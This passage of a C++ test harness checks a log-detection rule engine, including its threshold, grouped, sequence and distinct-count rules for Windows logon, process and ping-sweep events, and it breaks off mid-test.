// Standalone test harness for the rule engine components.
// Builds as a console app (no WIN32) so output goes to the terminal.
// Verifies: YAML rule loading, simple/threshold/sequence rule matching,
// and the three action types routing to file:// destinations.

#include "Config.h"
#include "EventBuffer.h"
#include "Platform.h"
#include "EventSource.h"
#ifdef _WIN32
#include "EventCollector.h"
#include "BookmarkStore.h"
#include "LogGrowthMonitor.h"
#else
#include "JournalEvent.h"
#endif
#include "Forwarder.h"
#include "RuleEngine.h"
#include "YamlRuleLoader.h"
#include "FieldResolver.h"
#include "Console.h"
#include "SpoolQueue.h"
#include "AgentClient.h"
#include "HttpClient.h"

#include <iostream>
#include <fstream>
#include <iterator>
#include <filesystem>
#include <cassert>
#include <thread>
#include <chrono>
#include <set>
#include <atomic>
#include <cstdlib>
#include <nlohmann/json.hpp>
#ifdef _WIN32
#include <windows.h>
#include <winevt.h>
#endif

// Set an environment variable in this process (the env: secret tests).
static void setTestEnv(const char* name, const char* value) {
#ifdef _WIN32
    SetEnvironmentVariableA(name, value);
#else
    setenv(name, value, 1);
#endif
}

using namespace elf;

static int g_pass = 0, g_fail = 0;
#define CHECK(cond) do { if (cond) { ++g_pass; } else { ++g_fail; std::cout << "FAIL: " #cond " (line " << __LINE__ << ")\n"; } } while (0)

// Build a minimal Windows event XML for testing. EventRecordID is a System
// element (sibling of EventID) and is used by the engine to dedup threshold
// counting across re-evaluation passes, so we include a monotonically
// increasing record ID on every generated event.
static long long g_nextRecordId = 1000;
static std::wstring makeEvent(int event_id, const std::wstring& channel,
                              const std::vector<std::pair<std::wstring,std::wstring>>& data) {
    std::wstring xml = L"<Event><System><Provider Name=\"Test\"/>";
    xml += L"<EventID>" + std::to_wstring(event_id) + L"</EventID>";
    xml += L"<EventRecordID>" + std::to_wstring(g_nextRecordId++) + L"</EventRecordID>";
    xml += L"<Channel>" + channel + L"</Channel>";
    xml += L"<Computer>HOST</Computer></System><EventData>";
    for (auto& d : data) {
        xml += L"<Data Name=\"" + d.first + L"\">" + d.second + L"</Data>";
    }
    xml += L"</EventData></Event>";
    return xml;
}

static BufferedEvent makeEvt(int event_id, const std::wstring& channel,
                             const std::vector<std::pair<std::wstring,std::wstring>>& data) {
    BufferedEvent e;
    e.receivedAt = std::chrono::system_clock::now();
    e.xml = makeEvent(event_id, channel, data);
    return e;
}

int main() {
    // The suite's rules are Windows rules on Windows channels; evaluate them
    // as a Windows host would, whichever platform runs the harness.
    setHostSigmaProductForTests("windows");
    // --- FieldResolver ---
    {
        auto xml = makeEvent(4688, L"Security", {{L"CommandLine", L"calc.exe"}});
        CHECK(extractEventId(xml) == 4688);
        CHECK(extractChannel(xml) == L"Security");
        CHECK(resolveField(xml, "CommandLine") == L"calc.exe");
        CHECK(resolveField(xml, "Computer") == L"HOST");
    }

    // --- Config + destinations ---
    Config cfg;
    cfg.retention_seconds = 30;
    cfg.destinations["alerts"] = {"alerts", "file://alerts.jsonl", "file", "alerts.jsonl"};
    cfg.destinations["siem"] = {"siem", "file://siem.jsonl", "file", "siem.jsonl"};
    cfg.destinations["data_lake"] = {"data_lake", "file://data_lake.jsonl", "file", "data_lake.jsonl"};

    // Clean any prior output files.
    for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);

    // --- Load rules from a self-contained test rules directory ---
    // We write our own rule files to a temp dir instead of loading from the
    // repo's live rules/ directory, because the running agent syncs rules/
    // from the management server on every poll and may add/remove files
    // there, which would make this test flaky.
    {
        namespace fs = std::filesystem;
        fs::create_directories("test_rules");
        fs::path dir = "test_rules";
        // Simple rule: alert + forward_buffer on calc.exe (4688).
        std::ofstream(dir / "win_calc_susp.yaml") <<
            "title: Suspicious Process Launch (calc)\n"
            "id: win_calc_susp\n"
            "status: experimental\n"
            "level: low\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4688\n"
            "    Image|contains: calc.exe\n"
            "  condition: selection\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n"
            "      message: \"Suspicious process detected: calc.exe launched.\"\n"
            "    - type: forward_buffer\n"
            "      destination: data_lake\n";
        // Threshold rule: 5 failed logons in 60s.
        std::ofstream(dir / "win_brute_force_logon.yaml") <<
            "title: Brute Force Logon Attempt\n"
            "id: win_brute_force_logon\n"
            "status: stable\n"
            "level: high\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4625\n"
            "  condition: selection\n"
            "elf:\n"
            "  threshold: 5\n"
            "  timeframe: 60s\n"
            "  group_by: Computer\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n"
            "      message: \"Possible brute-force logon.\"\n"
            "    - type: forward_buffer\n"
            "      destination: siem\n";
        // Sequence rule: failed (4625) then success (4624) within 120s.
        std::ofstream(dir / "win_failed_then_success_logon.yaml") <<
            "title: Failed Then Success Logon\n"
            "id: win_failed_then_success_logon\n"
            "status: stable\n"
            "level: medium\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection_failed:\n"
            "    EventID: 4625\n"
            "  selection_success:\n"
            "    EventID: 4624\n"
            "  condition: selection_failed or selection_success\n"
            "elf:\n"
            "  timeframe: 120s\n"
            "  sequence:\n"
            "    - selection:\n"
            "        EventID: 4625\n"
            "      condition: selection\n"
            "    - selection:\n"
            "        EventID: 4624\n"
            "      condition: selection\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n"
            "      message: \"Failed then success logon.\"\n";
        // Simple rule: forward_event on every 4624.
        std::ofstream(dir / "win_forward_all_logons.yaml") <<
            "title: Forward All Logons\n"
            "id: win_forward_all_logons\n"
            "status: stable\n"
            "level: informational\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4624\n"
            "  condition: selection\n"
            "elf:\n"
            "  actions:\n"
            "    - type: forward_event\n"
            "      destination: siem\n";
        // Threshold rule: 2 calc launches in 7s.
        std::ofstream(dir / "win_alert_calc.yaml") <<
            "title: Calculator\n"
            "id: win_alert_calc\n"
            "status: stable\n"
            "level: low\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4688\n"
            "    Image|contains: calc.exe\n"
            "  condition: selection\n"
            "elf:\n"
            "  threshold: 2\n"
            "  timeframe: 7s\n"
            "  group_by: Computer\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: siem\n";
        // Grouped threshold rule: 2 failed logons per TargetUserName in 60s.
        // Lower threshold for fast tests; uses TargetUserName (not Computer)
        // so we can prove per-user counting with explicit user data.
        std::ofstream(dir / "win_grouped_brute_force.yaml") <<
            "title: Grouped Brute Force Logon\n"
            "id: win_grouped_brute_force\n"
            "status: stable\n"
            "level: high\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4625\n"
            "  condition: selection\n"
            "elf:\n"
            "  threshold: 2\n"
            "  timeframe: 60s\n"
            "  group_by: TargetUserName\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n"
            "      message: \"Per-user brute-force logon.\"\n";
        // Threshold rule with threshold_op: gt. threshold 2 â†’ fires at count 3.
        std::ofstream(dir / "win_threshold_gt.yaml") <<
            "title: Threshold GT\n"
            "id: win_threshold_gt\n"
            "status: stable\n"
            "level: medium\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4625\n"
            "  condition: selection\n"
            "elf:\n"
            "  threshold: 2\n"
            "  timeframe: 60s\n"
            "  group_by: Computer\n"
            "  threshold_op: gt\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n"
            "      message: \"More than 2 failed logons.\"\n";
        // Threshold rule with threshold_op: eq. threshold 3 â†’ fires at exactly 3.
        std::ofstream(dir / "win_threshold_eq.yaml") <<
            "title: Threshold EQ\n"
            "id: win_threshold_eq\n"
            "status: stable\n"
            "level: medium\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4625\n"
            "  condition: selection\n"
            "elf:\n"
            "  threshold: 3\n"
            "  timeframe: 60s\n"
            "  group_by: Computer\n"
            "  threshold_op: eq\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n"
            "      message: \"Exactly 3 failed logons.\"\n";
        // Threshold rule with distinct: count unique DestAddress values
        // (ping-sweep shape). threshold 3 -> fires on 3 unique destination
        // IPs, NOT on 3+ events to the same IP.
        std::ofstream(dir / "win_ping_sweep_distinct.yaml") <<
            "title: Ping Sweep Distinct\n"
            "id: win_ping_sweep_distinct\n"
            "status: stable\n"
            "level: medium\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 5156\n"
            "    Protocol: 1\n"
            "  condition: selection\n"
            "elf:\n"
            "  threshold: 3\n"
            "  timeframe: 60s\n"
            "  group_by: Computer\n"
            "  distinct: DestAddress\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n"
            "      message: \"Ping sweep: 3 unique destination IPs.\"\n";
    }
    auto rules = loadRulesFromDirectory("test_rules");
    CHECK(rules.size() == 9);

    // --- Simple rule (calc) ---
    {
        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(rules);

        // Push a calc event and evaluate.
        buf.push(makeEvt(4688, L"Security", {{L"NewProcessName", L"C:\\Windows\\System32\\calc.exe"}}).xml);
        size_t fires = eng.evaluateOnce();
        CHECK(fires >= 1);

        // alerts.jsonl should have one alert payload; data_lake should have a buffer forward.
        // The alert payload is now a multi-line block: a plain-text header
        // (# ELF Alert / rule_id / message / timestamp / ---) followed by the
        // event as pretty-printed XML. Read the whole file and check the
        // header markers + rule id appear.
        std::ifstream af("alerts.jsonl");
        std::string acontent((std::istreambuf_iterator<char>(af)),
                             std::istreambuf_iterator<char>());
        CHECK(acontent.find("# ELF Alert") != std::string::npos);
        CHECK(acontent.find("rule_id: win_calc_susp") != std::string::npos);
        // Simple rules carry no correlation evidence, so the payload must NOT
        // contain a window/sequence evidence section.
        CHECK(acontent.find("# Window events") == std::string::npos);
        CHECK(acontent.find("# Sequence events") == std::string::npos);

        // forward_buffer writes raw Windows event XML (one event per line,
        // no JSON wrapper) to the destination. The buffer held the calc
        // event we just pushed, so data_lake.jsonl should contain that
        // event's XML â€” check for the EventID marker.
        std::ifstream df("data_lake.jsonl");
        std::string dline; std::getline(df, dline);
        CHECK(dline.find("<EventID>4688</EventID>") != std::string::npos);
    }

    // --- Threshold rule (5 failed logons in 60s) ---
    {
        for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
        // Isolate the brute-force rule so the other 4625-matching threshold
        // rules (win_grouped_brute_force, win_threshold_gt, win_threshold_eq)
        // don't also fire on these events and pollute alerts.jsonl.
        std::vector<Detection> bfRules;
        for (const auto& r : rules) {
            if (r.id == "win_brute_force_logon") bfRules.push_back(r);
        }
        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(bfRules);

        // Push 4 failed logons - should NOT fire.
        for (int i = 0; i < 4; ++i) {
            buf.push(makeEvt(4625, L"Security", {}).xml);
            eng.evaluateOnce();
        }
        std::ifstream af1("alerts.jsonl");
        CHECK(af1.good() == false || af1.peek() == std::ifstream::traits_type::eof());

        // 5th failed logon - should fire.
        buf.push(makeEvt(4625, L"Security", {}).xml);
        size_t fires = eng.evaluateOnce();
        CHECK(fires >= 1);

        std::ifstream af("alerts.jsonl");
        std::string acontent((std::istreambuf_iterator<char>(af)),
                             std::istreambuf_iterator<char>());
        CHECK(acontent.find("rule_id: win_brute_force_logon") != std::string::npos);
        // Threshold evidence: the alert payload must carry ALL 5 events
        // that filled the window (non-distinct rule -> every counted event
        // is evidence), not just the trigger. The evidence section header
        // counts them and each event's pretty XML is embedded.
        CHECK(acontent.find("# Window events (5)") != std::string::npos);
        CHECK(acontent.find("Window events [5]") != std::string::npos);
        CHECK(acontent.find("Window events [6]") == std::string::npos);
    }

    // --- Threshold rule: single event must NOT fire across a reload ---
    // Regression: one real event must never satisfy threshold:2. The
    // dedup-by-record-ID guard depends on EventRecordID being extracted from
    // the System element; without it a re-evaluated event is counted again.
    // reload() is what the agent's poll thread calls every cycle; whatever it
    // does to engine state, the same buffered event (same EventRecordID) must
    // not be counted a second time. Uses win_alert_calc (threshold 2 / 7s).
    {
        for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
        std::vector<Detection> calcRules;
        for (const auto& r : rules) {
            if (r.id == "win_alert_calc") calcRules.push_back(r);
        }
        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(calcRules);

        // One calc event. Threshold is 2, so this must NOT fire.
        buf.push(makeEvt(4688, L"Security", {{L"NewProcessName", L"C:\\Windows\\System32\\calc.exe"}}).xml);
        size_t fires1 = eng.evaluateOnce();
        CHECK(fires1 == 0);

        // Simulate a server poll: reload() swaps the ruleset. This must still
        // NOT fire: the event carries the same EventRecordID, so even a
        // re-evaluation cannot count it twice.
        eng.reload(calcRules);
        size_t fires2 = eng.evaluateOnce();
        CHECK(fires2 == 0);

        std::ifstream af("alerts.jsonl");
        bool empty = !af.good() || af.peek() == std::ifstream::traits_type::eof();
        CHECK(empty);
    }

    // --- Threshold rule: two events fire EXACTLY ONCE (no multi-fire) ---
    // Regression: when a threshold fires, ALL events in the window must be
    // marked as already-fired, not only the TRIGGERING one. Otherwise, when
    // the buffer shrinks (cleanup pops old events from the front) and the
    // evaluation cursor resets, an unmarked contributing event is re-counted
    // into a fresh window and the next event pairs with it to hit
    // threshold=2 again -> spurious second alert. The re-evaluation is
    // simulated by running another pass over the same buffer.
    {
        for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
        std::vector<Detection> calcRules;
        for (const auto& r : rules) {
            if (r.id == "win_alert_calc") calcRules.push_back(r);
        }
        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(calcRules);

        // Two calc events -> threshold 2 -> fire EXACTLY ONCE.
        buf.push(makeEvt(4688, L"Security", {{L"NewProcessName", L"C:\\Windows\\System32\\calc.exe"}}).xml);
        eng.evaluateOnce();
        buf.push(makeEvt(4688, L"Security", {{L"NewProcessName", L"C:\\Windows\\System32\\calc.exe"}}).xml);
        size_t fires1 = eng.evaluateOnce();
        CHECK(fires1 == 1);

        // Re-evaluate the same buffer (simulates the cursor resetting after a
        // buffer shrink). Must NOT fire again: both contributing events are
        // now marked as already-fired for this rule.
        size_t fires2 = eng.evaluateOnce();
        CHECK(fires2 == 0);

        // A genuinely NEW (third) calc event alone must NOT fire: the window
        // was cleared after the fire, so this is just 1 match < threshold 2.
        buf.push(makeEvt(4688, L"Security", {{L"NewProcessName", L"C:\\Windows\\System32\\calc.exe"}}).xml);
        size_t fires3 = eng.evaluateOnce();
        CHECK(fires3 == 0);

        // A fourth calc event pairs with the third to hit threshold 2 -> fire
        // EXACTLY ONCE more (a fresh burst).
        buf.push(makeEvt(4688, L"Security", {{L"NewProcessName", L"C:\\Windows\\System32\\calc.exe"}}).xml);
        size_t fires4 = eng.evaluateOnce();
        CHECK(fires4 == 1);

        // Count alert lines: should be exactly 2 (one per burst). The rule's
        // action is alert -> siem, so alerts land in siem.jsonl.
        std::ifstream af("siem.jsonl");
        int alertCount = 0;
        std::string line;
        while (std::getline(af, line)) {
            if (line.find("win_alert_calc") != std::string::npos) ++alertCount;
        }
        CHECK(alertCount == 2);
    }

    // --- Sequence rule (notepad.exe then calc.exe within 120s) ---
    {
        for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
        // Isolate the sequence rule so the simple calc rule doesn't also fire
        // on the calc events and pollute alerts.jsonl.
        std::vector<Detection> seqRules;
        for (const auto& r : rules) {
            if (r.id == "win_failed_then_success_logon") seqRules.push_back(r);
        }
        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(seqRules);

        // Wrong order: success (4624) then failed (4625) - should NOT fire.
        buf.push(makeEvt(4624, L"Security", {}).xml);
        eng.evaluateOnce();
        buf.push(makeEvt(4625, L"Security", {}).xml);
        eng.evaluateOnce();
        {
            std::ifstream af("alerts.jsonl");
            bool empty = !af.good() || af.peek() == std::ifstream::traits_type::eof();
            CHECK(empty);
        }

        // Correct order: failed (4625) then success (4624) - should fire.
        buf.push(makeEvt(4625, L"Security", {}).xml);
        eng.evaluateOnce();
        buf.push(makeEvt(4624, L"Security", {}).xml);
        size_t fires = eng.evaluateOnce();
        CHECK(fires >= 1);

        std::ifstream af("alerts.jsonl");
        std::string acontent((std::istreambuf_iterator<char>(af)),
                             std::istreambuf_iterator<char>());
        CHECK(acontent.find("rule_id: win_failed_then_success_logon") != std::string::npos);
    }

    // --- forward_event (continuous) rule (all 4624) ---
    {
        for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(rules);

        // Two successful logons -> two lines in siem.jsonl.
        buf.push(makeEvt(4624, L"Security", {}).xml);
        eng.evaluateOnce();
        buf.push(makeEvt(4624, L"Security", {}).xml);
        eng.evaluateOnce();

        std::ifstream sf("siem.jsonl");
        int lines = 0; std::string l;
        while (std::getline(sf, l)) ++lines;
        CHECK(lines == 2);
    }

    // --- Grouped threshold: per-user counting ---
    // 2x Alice fires (count 2 for Alice); 1x Bob does NOT fire (Bob's window
    // has 1); 1 more Bob fires (Bob reaches 2). Assert 2 alert lines.
    {
        for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
        std::vector<Detection> grpRules;
        for (const auto& r : rules) {
            if (r.id == "win_grouped_brute_force") grpRules.push_back(r);
        }
        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(grpRules);

        // 2x Alice -> fires (Alice's window reaches threshold 2).
        buf.push(makeEvt(4625, L"Security", {{L"TargetUserName", L"Alice"}}).xml);
        eng.evaluateOnce();
        buf.push(makeEvt(4625, L"Security", {{L"TargetUserName", L"Alice"}}).xml);
        size_t f1 = eng.evaluateOnce();
        CHECK(f1 == 1);

        // 1x Bob -> does NOT fire (Bob's window has 1).
        buf.push(makeEvt(4625, L"Security", {{L"TargetUserName", L"Bob"}}).xml);
        size_t f2 = eng.evaluateOnce();
        CHECK(f2 == 0);

        // 1 more Bob -> fires (Bob reaches 2).
        buf.push(makeEvt(4625, L"Security", {{L"TargetUserName", L"Bob"}}).xml);
        size_t f3 = eng.evaluateOnce();
        CHECK(f3 == 1);

        // Exactly 2 alert lines total (one per user).
        std::ifstream af("alerts.jsonl");
        int alertCount = 0;
        std::string line;
        while (std::getline(af, line)) {
            if (line.find("win_grouped_brute_force") != std::string::npos) ++alertCount;
        }
        CHECK(alertCount == 2);
    }

    // --- Grouped threshold: cross-group isolation ---
    // 1x Alice + 1x Bob + 1x Alice -> Alice fires (2), Bob does not (1).
    // Assert exactly 1 alert.
    {
        for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
        std::vector<Detection> grpRules;
        for (const auto& r : rules) {
            if (r.id == "win_grouped_brute_force") grpRules.push_back(r);
        }
        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(grpRules);

        buf.push(makeEvt(4625, L"Security", {{L"TargetUserName", L"Alice"}}).xml);
        eng.evaluateOnce();
        buf.push(makeEvt(4625, L"Security", {{L"TargetUserName", L"Bob"}}).xml);
        eng.evaluateOnce();
        buf.push(makeEvt(4625, L"Security", {{L"TargetUserName", L"Alice"}}).xml);
        size_t fires = eng.evaluateOnce();
        CHECK(fires == 1);

        std::ifstream af("alerts.jsonl");
        int alertCount = 0;
        std::string line;
        while (std::getline(af, line)) {
            if (line.find("win_grouped_brute_force") != std::string::npos) ++alertCount;
        }
        CHECK(alertCount == 1);
    }

    // --- Grouped threshold: reload doesn't double-count ---
    // 1x Alice, reload(), 1x Alice -> fires exactly once. Proves m_states
    // survives reload (reload does NOT reset state) and the cursor isn't
    // reset, so the first Alice event isn't re-counted.
    {
        for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
        std::vector<Detection> grpRules;
        for (const auto& r : rules) {
            if (r.id == "win_grouped_brute_force") grpRules.push_back(r);
        }
        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(grpRules);

        buf.push(makeEvt(4625, L"Security", {{L"TargetUserName", L"Alice"}}).xml);
        size_t f1 = eng.evaluateOnce();
        CHECK(f1 == 0);

        // reload() swaps the rules vector but does NOT reset m_states or the
        // cursor (per the reload() comment). The first Alice event must not
        // be re-counted.
        eng.reload(grpRules);
        buf.push(makeEvt(4625, L"Security", {{L"TargetUserName", L"Alice"}}).xml);
        size_t f2 = eng.evaluateOnce();
        CHECK(f2 == 1);

        std::ifstream af("alerts.jsonl");
        int alertCount = 0;
        std::string line;
        while (std::getline(af, line)) {
            if (line.find("win_grouped_brute_force") != std::string::npos) ++alertCount;
        }
        CHECK(alertCount == 1);
    }

    // --- Grouped threshold: missing group field -> sentinel bucket ---
    // 2x 4625 with no TargetUserName -> both land in the <missing> bucket ->
    // fires once. Asserts the sentinel fallback works (events aren't dropped).
    {
        for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
        std::vector<Detection> grpRules;
        for (const auto& r : rules) {
            if (r.id == "win_grouped_brute_force") grpRules.push_back(r);
        }
        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(grpRules);

        // No TargetUserName data -> resolveField returns empty -> <missing>.
        buf.push(makeEvt(4625, L"Security", {}).xml);
        eng.evaluateOnce();
        buf.push(makeEvt(4625, L"Security", {}).xml);
        size_t fires = eng.evaluateOnce();
        CHECK(fires == 1);

        std::ifstream af("alerts.jsonl");
        int alertCount = 0;
        std::string line;
        while (std::getline(af, line)) {
            if (line.find("win_grouped_brute_force") != std::string::npos) ++alertCount;
        }
        CHECK(alertCount == 1);
    }

    // --- Threshold op: gt (fires at count > threshold) ---
    // threshold 2, threshold_op: gt -> fires at count 3, not 2.
    {
        for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
        std::vector<Detection> gtRules;
        for (const auto& r : rules) {
            if (r.id == "win_threshold_gt") gtRules.push_back(r);
        }
        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(gtRules);

        // 2 events -> count 2, not > 2 -> no fire.
        buf.push(makeEvt(4625, L"Security", {}).xml);
        eng.evaluateOnce();
        buf.push(makeEvt(4625, L"Security", {}).xml);
        size_t f1 = eng.evaluateOnce();
        CHECK(f1 == 0);

        // 3rd event -> count 3 > 2 -> fires.
        buf.push(makeEvt(4625, L"Security", {}).xml);
        size_t f2 = eng.evaluateOnce();
        CHECK(f2 == 1);

        std::ifstream af("alerts.jsonl");
        int alertCount = 0;
        std::string line;
        while (std::getline(af, line)) {
            if (line.find("win_threshold_gt") != std::string::npos) ++alertCount;
        }
        CHECK(alertCount == 1);
    }

    // --- Threshold op: eq (fires at count == threshold) ---
    // threshold 3, threshold_op: eq -> fires at exactly 3, not 2 or 4.
    {
        for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
        std::vector<Detection> eqRules;
        for (const auto& r : rules) {
            if (r.id == "win_threshold_eq") eqRules.push_back(r);
        }
        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(eqRules);

        // 2 events -> count 2 != 3 -> no fire.
        buf.push(makeEvt(4625, L"Security", {}).xml);
        eng.evaluateOnce();
        buf.push(makeEvt(4625, L"Security", {}).xml);
        size_t f1 = eng.evaluateOnce();
        CHECK(f1 == 0);

        // 3rd event -> count 3 == 3 -> fires. Window resets after fire.
        buf.push(makeEvt(4625, L"Security", {}).xml);
        size_t f2 = eng.evaluateOnce();
        CHECK(f2 == 1);

        // 4th event -> window reset to count 1 != 3 -> no fire.
        buf.push(makeEvt(4625, L"Security", {}).xml);
        size_t f3 = eng.evaluateOnce();
        CHECK(f3 == 0);

        std::ifstream af("alerts.jsonl");
        int alertCount = 0;
        std::string line;
        while (std::getline(af, line)) {
            if (line.find("win_threshold_eq") != std::string::npos) ++alertCount;
        }
        CHECK(alertCount == 1);
    }

    // --- Distinct counting: same-IP storm must NOT fire ---
    // Regression: `ping -n 10 <onehost>` produces
    // 10 matching events but only 1 unique DestAddress. A distinct rule with
    // threshold 3 must NOT fire on any number of repeats of the same IP.
    {
        for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
        std::vector<Detection> dRules;
        for (const auto& r : rules) {
            if (r.id == "win_ping_sweep_distinct") dRules.push_back(r);
        }
        CHECK(dRules.size() == 1);
        CHECK(dRules[0].distinct_by.size() == 1);
        CHECK(dRules[0].distinct_by[0] == "DestAddress");
        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(dRules);

        // 10 events, all to the SAME destination IP -> 1 unique value ->
        // never reaches threshold 3 -> no fire.
        for (int i = 0; i < 10; ++i) {
            buf.push(makeEvt(5156, L"Security",
                              {{L"Protocol", L"1"}, {L"DestAddress", L"10.0.0.1"}}).xml);
            eng.evaluateOnce();
        }
        size_t fires = 0;
        for (int i = 0; i < 10; ++i) {
            buf.push(makeEvt(5156, L"Security",
                              {{L"Protocol", L"1"}, {L"DestAddress", L"10.0.0.1"}}).xml);
            fires += eng.evaluateOnce();
        }
        CHECK(fires == 0);

        std::ifstream af("alerts.jsonl");
        int alertCount = 0;
        std::string line;
        while (std::getline(af, line)) {
            if (line.find("win_ping_sweep_distinct") != std::string::npos) ++alertCount;
        }
        CHECK(alertCount == 0);
    }

    // --- Distinct counting: unique destinations DO fire ---
    // 3 events to 3 different destination IPs -> 3 unique values -> fires
    // exactly once at the 3rd. A 4th unique IP after the reset re-arms the
    // window (count 1) and must not immediately re-fire.
    {
        for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
        std::vector<Detection> dRules;
        for (const auto& r : rules) {
            if (r.id == "win_ping_sweep_distinct") dRules.push_back(r);
        }
        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(dRules);

        // 2 unique IPs -> 2 unique values, not >= 3 -> no fire.
        buf.push(makeEvt(5156, L"Security",
                          {{L"Protocol", L"1"}, {L"DestAddress", L"10.0.0.1"}}).xml);
        CHECK(eng.evaluateOnce() == 0);
        buf.push(makeEvt(5156, L"Security",
                          {{L"Protocol", L"1"}, {L"DestAddress", L"10.0.0.2"}}).xml);
        CHECK(eng.evaluateOnce() == 0);

        // 3rd unique IP -> 3 unique values -> fires.
        buf.push(makeEvt(5156, L"Security",
                          {{L"Protocol", L"1"}, {L"DestAddress", L"10.0.0.3"}}).xml);
        CHECK(eng.evaluateOnce() == 1);

        // 4th unique IP after the fire -> window reset to 1 unique value ->
        // no immediate re-fire.
        buf.push(makeEvt(5156, L"Security",
                          {{L"Protocol", L"1"}, {L"DestAddress", L"10.0.0.4"}}).xml);
        CHECK(eng.evaluateOnce() == 0);

        std::ifstream af("alerts.jsonl");
        int alertCount = 0;
        std::string line;
        while (std::getline(af, line)) {
            if (line.find("win_ping_sweep_distinct") != std::string::npos) ++alertCount;
        }
        CHECK(alertCount == 1);

        // Distinct evidence: the alert payload must carry exactly ONE
        // representative event per unique value (3 events for 3 unique
        // IPs), each showing its DestAddress, so the analyst sees WHICH
        // destinations fired the rule, not just the trigger. The pretty-
        // printed XML puts each tag/text on its own line, so assert on
        // the IP values (they appear nowhere else in this payload).
        std::ifstream af2("alerts.jsonl");
        std::string acontent((std::istreambuf_iterator<char>(af2)),
                             std::istreambuf_iterator<char>());
        CHECK(acontent.find("# Window events (3)") != std::string::npos);
        CHECK(acontent.find("10.0.0.1") != std::string::npos);
        CHECK(acontent.find("10.0.0.2") != std::string::npos);
        CHECK(acontent.find("10.0.0.3") != std::string::npos);
        CHECK(acontent.find("10.0.0.4") == std::string::npos);
        CHECK(acontent.find("Window events [4]") == std::string::npos);
    }

    // --- Distinct counting: repeats refresh but don't add ---
    // Interleave repeats with unique IPs: 2 unique + many repeats stays at 2
    // unique values (no fire); the 3rd unique IP fires exactly once, and a
    // repeat of an already-seen IP after the reset does not re-fire.
    {
        for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
        std::vector<Detection> dRules;
        for (const auto& r : rules) {
            if (r.id == "win_ping_sweep_distinct") dRules.push_back(r);
        }
        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(dRules);

        // 2 unique IPs, each repeated -> still 2 unique values.
        for (int i = 0; i < 3; ++i) {
            buf.push(makeEvt(5156, L"Security",
